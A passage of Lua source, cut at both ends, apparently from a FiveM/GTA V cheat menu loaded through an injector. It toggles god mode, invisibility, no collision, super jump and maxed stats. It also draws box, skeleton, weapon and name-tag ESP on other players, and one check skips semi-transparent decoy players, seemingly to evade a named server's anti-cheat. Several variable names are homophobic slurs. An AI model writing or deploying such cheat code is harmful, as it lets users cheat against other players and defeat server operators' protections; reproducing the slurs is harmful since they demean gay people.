                        if Winnie_IsDisabledControlPressed(1, 21) then
                            F = F + 0.1 * 2.5
                        end
                        if Winnie_IsDisabledControlPressed(1, 36) then
                            F = F - 0.1 * 0.5
                        end

                    end


            end)
        end


            SetEntityProofs(PlayerPedId(), ZM_KeyboardUI.Checkbox["bulletproof-function"], ZM_KeyboardUI.Checkbox["fireproof-function"], ZM_KeyboardUI.Checkbox["explosionproof-function"], false, ZM_KeyboardUI.Checkbox["meleeproof-function"], false, false, false)
            SetPedDiesInWater(PlayerPedId(), not ZM_KeyboardUI.Checkbox["waterproof-function"])

            if ZM_M1000.gd or ZM_KeyboardUI.Checkbox["godmode-function"] then
                Winnie_SetEntityInvincible(Winnie_PlayerPedId(), true)
            else
                Winnie_SetEntityInvincible(Winnie_PlayerPedId(), false)
            end

            if ZM_M1000.ivs or ZM_KeyboardUI.Checkbox["invisible-function"] then
                Winnie_SetEntityVisible(Winnie_PlayerPedId(), false)
            else
                Winnie_SetEntityVisible(Winnie_PlayerPedId(), true)
            end

            if ZM_M1000.stmn or ZM_KeyboardUI.Checkbox["stamina-function"] then
                Winnie_ResetPlayerStamina(Winnie_PlayerId())
            end

            if ZM_M1000.ncl or ZM_KeyboardUI.Checkbox["nocollision-function"] then
                Winnie_SetPedCapsule(Winnie_PlayerPedId(), 5)
                Winnie_SetEntityCollision(Winnie_PlayerPedId(), false, false)
            else
                Winnie_SetPedCapsule(Winnie_PlayerPedId(), 0)
                Winnie_SetEntityCollision(Winnie_PlayerPedId(), true, true)
            end

            if ZM_M1000.authl or ZM_KeyboardUI.Checkbox["autohealth-function"] then
                local get = Winnie_GetEntityHealth(Winnie_PlayerPedId())
                if get <= 199 then
                    Winnie_SetEntityHealth(Winnie_PlayerPedId(), 200)
                end
            end


            if ZM_M1000.fkd or ZM_KeyboardUI.Checkbox["fakedead-function"] then
                Winnie_SetPedToRagdoll(Winnie_PlayerPedId(), 1000, 1000, 0, true, true, false)
            end

            if ZM_M1000.opplayer or ZM_KeyboardUI.Checkbox["opacityplayer-function"] then
                if ZM_KeyboardUI.Checkbox["opacityplayer-function"] then
                    Winnie_SetEntityAlpha(Winnie_PlayerPedId(), SliderKeyboard["opacityvalue"].value)
                else
                    Winnie_SetEntityAlpha(Winnie_PlayerPedId(), math.floor(255 * rE_Slider["Slider_opacityplayer_value"]))
                end
            end


            if ZM_M1000.fstswin or ZM_KeyboardUI.Checkbox["fastswim-function"] then
                SetSwimMultiplierForPlayer(Winnie_PlayerId(), 1.49)
            else
                SetSwimMultiplierForPlayer(Winnie_PlayerId(), 1.0)
            end

            if ZM_KeyboardUI.Checkbox["fastrun-function"] then
                Winnie_SetPedMoveRateOverride(Winnie_PlayerPedId(), SliderKeyboard["fastrun-speed"].value)
            else
                Winnie_SetPedMoveRateOverride(Winnie_PlayerPedId(), 1.0)
            end

            if ZM_M1000.fst then
                Winnie_SetPedMoveRateOverride(Winnie_PlayerPedId(), 1.40)
            else
                Winnie_SetPedMoveRateOverride(Winnie_PlayerPedId(), 1.0)
            end

            if ZM_M1000.stmnshot then
                Winnie_ResetPlayerStamina(Winnie_PlayerId())
            end



            if ZM_M1000.rollinfinity or ZM_KeyboardUI.Checkbox["rollinfinity-function"] then
                Winnie_StatSetInt(Winnie_GetHashKey("MP0_STRENGTH"),1100,true)
                Winnie_StatSetInt(Winnie_GetHashKey("MP0_WHEELIE_ABILITY"),1100,true)
                Winnie_StatSetInt(Winnie_GetHashKey("MP0_DRIVING_ABILITY"),1100,true)
                Winnie_StatSetInt(Winnie_GetHashKey("MP0_FLYING_ABILITY"),1100,true)
                Winnie_StatSetInt(Winnie_GetHashKey("MP0_SHOOTING_ABILITY"),1100,true)
                Winnie_StatSetInt(Winnie_GetHashKey("MP0_STEALTH_ABILITY"),1100,true)
            end


            if ZM_M1000.nrgl then
                SetPedCanRagdoll(PlayerPedId(), false)
            end

            if ZM_M1000.jp or ZM_KeyboardUI.Checkbox["superjump-function"] then
                Winnie_SetSuperJumpThisFrame(Winnie_PlayerId())
            end

            Winnie_SetFakeWantedLevel(math.floor(6 * rE_Slider["Slider_wantedplayer_value"])) -- not opti but i have not idea for optimize this



                         if ZM_KeyboardUI.Checkbox["boxesp-function"] or ZM_KeyboardUI.Checkbox["healthbar-function"] or ZM_KeyboardUI.Checkbox["armorbar-function"] then
                            for k, v in pairs(GetGamePool("CPed")) do

                                if ZM_KeyboardUI.Checkbox["includeself-function"] then
                                    ZM_KeyboardUI.faggot = v
                                else
                                    ZM_KeyboardUI.faggot = v ~= Winnie_PlayerPedId()
                                end

                                if ZM_KeyboardUI.Checkbox["includepedvisual-function"] then
                                    ZM_KeyboardUI.fgt = Winnie_IsPedAPlayer(v)
                                else
                                    ZM_KeyboardUI.fgt = v
                                end

                                if  ZM_KeyboardUI.fgt and ZM_KeyboardUI.faggot and IsEntityOnScreen(v) then
                                    BoxesKeyboard(v)      
                                end
                                
                            end
                        end

                        if ZM_M1000.boxes or ZM_M1000.abar or ZM_M1000.hbar and not ZM_M1000.Draw then
                            
                            for k, v in pairs(GetGamePool("CPed")) do
                                if ZM_M1000.icnself then
                                    ZM_M1000.faggot = v
                                else
                                    ZM_M1000.faggot = v ~= Winnie_PlayerPedId()
                                end

                                if ZM_M1000.icnpeds then
                                    ZM_M1000.fgt = Winnie_IsPedAPlayer(v)
                                else
                                    ZM_M1000.fgt = v
                                end
                                if  ZM_M1000.fgt and ZM_M1000.faggot and IsEntityOnScreen(v) then
                                    Boxes(v)      
                                end
                            end
                        end


                        if ZM_KeyboardUI.Checkbox["weaponesp-function"] then
                            for k, v in pairs(GetGamePool("CPed")) do

                                if ZM_KeyboardUI.Checkbox["includeself-function"] then
                                    ZM_KeyboardUI.faggot = v
                                else
                                    ZM_KeyboardUI.faggot = v ~= Winnie_PlayerPedId()
                                end

                                if ZM_KeyboardUI.Checkbox["includepedvisual-function"] then
                                    ZM_KeyboardUI.fgt = Winnie_IsPedAPlayer(v)
                                else
                                    ZM_KeyboardUI.fgt = v
                                end


                            if ZM_KeyboardUI.fgt and ZM_KeyboardUI.faggot then
                                    EspWeaponKeyboard(v)
                                end
                            end
                        end

                        if ZM_M1000.eweapon then
                            for k, v in pairs(GetGamePool("CPed")) do




                                if ZM_M1000.icnself then
                                    ZM_M1000.faggot = v
                                else
                                    ZM_M1000.faggot = v ~= Winnie_PlayerPedId()
                                end

                                if ZM_M1000.icnpeds then
                                    ZM_M1000.fgt = Winnie_IsPedAPlayer(v)
                                else
                                    ZM_M1000.fgt = v
                                end


                            if ZM_M1000.fgt and ZM_M1000.faggot then
                                    EspWeapon(v)
                                    end
                                end
                             end

                            if ZM_KeyboardUI.Checkbox["nametag-function"] then
                                NameTagKeyboard()
                            end

                            if ZM_M1000.plname then
                                NameTag()
                            end
                            if ZM_KeyboardUI.Checkbox["skeleton-function"] then
                                for k, v in pairs(GetGamePool("CPed")) do

                                    local bone = Winnie_GetPedBoneCoords(v, 0x0, 0.0, 0.0, 0.0)
                                    local size = shapeprout(bone)

                                    local pedSelect = Winnie_GetPlayerPed(v)
                                    local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                                    if ZM_KeyboardUI.Checkbox["includeself-function"] then
                                        ZM_KeyboardUI.faggot = v
                                    else
                                        ZM_KeyboardUI.faggot = v ~= Winnie_PlayerPedId()
                                    end

                                    if ZM_KeyboardUI.Checkbox["includepedvisual-function"] then
                                        ZM_KeyboardUI.fgt = Winnie_IsPedAPlayer(v)
                                    else
                                        ZM_KeyboardUI.fgt = v
                                    end


                                    local d = Winnie_GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), bone.x, bone.y, bone.z, true)
                                    if d <= SliderKeyboard["espdistance"].value then


                                    if ZM_KeyboardUI.faggot and ZM_KeyboardUI.fgt  then
                                        local antifakeplayer = GetEntityAlpha(v) <= 100
                                        if scriptresourceexist("gtalife-z") then
                                            if not antifakeplayer then
                                                Winnie_DrawLine(bonnetoscreen(v, 0x796E, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xCC4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3779, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xDEAD, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                                Winnie_DrawLine(bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x49D9, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            end
                                        else
                                            Winnie_DrawLine(bonnetoscreen(v, 0x796E, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xCC4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3779, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xDEAD, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                            Winnie_DrawLine(bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x49D9, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255)
                                        end
                                    end
                                end
                            end
                        end
                            if ZM_M1000.skelt then
                                for k, v in pairs(GetGamePool("CPed")) do

                                    local bone = Winnie_GetPedBoneCoords(v, 0x0, 0.0, 0.0, 0.0)
                                    local size = shapeprout(bone)

                                    local pedSelect = Winnie_GetPlayerPed(v)
                                    local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                                    if ZM_M1000.icnself then
                                        ZM_M1000.faggot = v
                                    else
                                        ZM_M1000.faggot = v ~= Winnie_PlayerPedId()
                                    end

                                    if ZM_M1000.icnpeds then
                                        ZM_M1000.fgt = Winnie_IsPedAPlayer(v)
                                    else
                                        ZM_M1000.fgt = v
                                    end


                                    local d = Winnie_GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), bone.x, bone.y, bone.z, true)
                                    if d <= math.abs(3000 * rE_Slider["Slider_espdistance_value"]) then


                                        if ZM_M1000.faggot and ZM_M1000.fgt  then
                                            local antifakeplayer = GetEntityAlpha(v) <= 100
                                            if scriptresourceexist("gtalife-z") then
                                                if not antifakeplayer then
                                                    redENGINE.AddLine(bonnetoscreen(v, 0x796E, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xCC4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3779, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xDEAD, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                    redENGINE.AddLine(bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x49D9, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                end
                                            else
                                                Winnie_DrawLine(bonnetoscreen(v, 0x796E, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255,100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x2E28, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x3FCF, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xCC4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0xB3FE, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x3779, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x9995, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x9D4D, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0xB1C5, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0x6E5C, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0xDEAD, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                                Winnie_DrawLine(bonnetoscreen(v, 0xEEEB, 0.0, 0.0, 0.0, size), bonnetoscreen(v, 0x49D9, 0.0, 0.0, 0.0, size), math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]), 255, 100)
                                            end
                                        end
                                    end
                                end
                            end

                        if ZM_M1000.tvision or ZM_KeyboardUI.Checkbox["thermalvision-function"] then
                            Winnie_SetSeethrough(true)
                        else
                            Winnie_SetSeethrough(false)
                        end

                        if ZM_M1000.nivision or ZM_KeyboardUI.Checkbox["nightvision-function"] then
                            Winnie_SetNightvision(true)
                        else
                            Winnie_SetNightvision(false)
                        end

                        if ZM_M1000.rmvfog or ZM_KeyboardUI.Checkbox["removefog-function"] then
                            Winnie_SetTimecycleModifier("yell_tunnel_nodirect")
                        end

                        if ZM_KeyboardUI.Checkbox["crosshair-function"] then
                            HideHudComponentThisFrame(14)
                            Winnie_DrawRect(0.50, 0.50, 0.005, 0.002, SliderKeyboard["crosshairr"].value, SliderKeyboard["crosshairg"].value, SliderKeyboard["crosshairb"].value, 255)
                            Winnie_DrawRect(0.50, 0.50, 0.001, 0.008, SliderKeyboard["crosshairr"].value, SliderKeyboard["crosshairg"].value, SliderKeyboard["crosshairb"].value, 255)
                            ClearDrawOrigin()
                        end

                        if ZM_M1000.chair then
                            HideHudComponentThisFrame(14)
                            Winnie_DrawRect(0.50, 0.50, 0.005, 0.002, 255, 255, 255, 255)
                            Winnie_DrawRect(0.50, 0.50, 0.001, 0.008, 255, 255, 255, 255)
                            ClearDrawOrigin()
                        end


                        if ZM_KeyboardUI.Checkbox["playerblips-function"] then
                            for k, v in pairs(GetActivePlayers()) do
                            id = GetPlayerPed(v)
                            local playerblip = GetBlipFromEntity(id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
                            if not DoesBlipExist(playerblip, CIT.ReturnResultAnyway()) then
                                playerblip = AddBlipForEntity(id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
                                SetBlipSprite(playerblip, 57)
                                ShowHeadingIndicatorOnBlip(playerblip, true)
                                SetBlipNameToPlayerName(playerblip, v)
                                SetBlipScale(playerblip, 0.80)
                                SetBlipColour(playerblip, 15)
                            end
                        end
                        else
                            if not ZM_KeyboardUI.Checkbox["playerblips-function"] then
                                local playerblip = GetBlipFromEntity(id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
                                if DoesBlipExist(playerblip) then
                                    RemoveBlip(playerblip)
                                end
                            end
                        end

                        if ZM_M1000.bllplp then
                            for k, v in pairs(GetActivePlayers()) do
                            id = GetPlayerPed(v)
                            local playerblip = GetBlipFromEntity(id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
                            if not DoesBlipExist(playerblip, CIT.ReturnResultAnyway()) then
                                playerblip = AddBlipForEntity(id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
                                SetBlipSprite(playerblip, 57)
                                ShowHeadingIndicatorOnBlip(playerblip, true)
                                SetBlipNameToPlayerName(playerblip, v)
                                SetBlipScale(playerblip, 0.80)
                                SetBlipColour(playerblip, 15)
                            end
                        end
                        else
                            if not ZM_M1000.bllplp then
                                local playerblip = GetBlipFromEntity(id, CIT.ReturnResultAnyway(), CIT.ResultAsInteger())
                                if DoesBlipExist(playerblip) then
                                    RemoveBlip(playerblip)
                                end
                            end
                        end


                        if ZM_M1000.nwater then
                            CIT.InvokeNative(0xC54A08C85AE4D410, 999999.0)
                        else
                            CIT.InvokeNative(0xC54A08C85AE4D410, 0.0)
                        end

                        if ZM_M1000.nprops then
                            for k, v in pairs(GetGamePool("CObject")) do
                                Winnie_SetEntityVisible(v, false, false)
                            end
                        end

                        if ZM_KeyboardUI.Checkbox["linesp-function"] then
                            for k, v in pairs(GetGamePool("CPed")) do
                                local selfCoords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                                local pedCoords = Winnie_GetEntityCoords(v)

                                if ZM_KeyboardUI.Checkbox["includeself-function"] then
                                    ZM_KeyboardUI.self = v
                                else
                                    ZM_KeyboardUI.self = v ~= Winnie_PlayerPedId()
                                end

                                if ZM_KeyboardUI.Checkbox["includepedvisual-function"] then
                                    ZM_KeyboardUI.other = Winnie_IsPedAPlayer(v)
                                else
                                    ZM_KeyboardUI.other = v
                                end

                                local d = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), pedCoords.x, pedCoords.y, pedCoords.z,true) * (1.1 - 0.2)
                                if ZM_KeyboardUI.other and ZM_KeyboardUI.self and not Winnie_IsEntityDead(v) then
                                    local antifakeplayer = GetEntityAlpha(v) <= 100
                                        if not antifakeplayer then
                                        if scriptresourceexist("gtalife-z") then
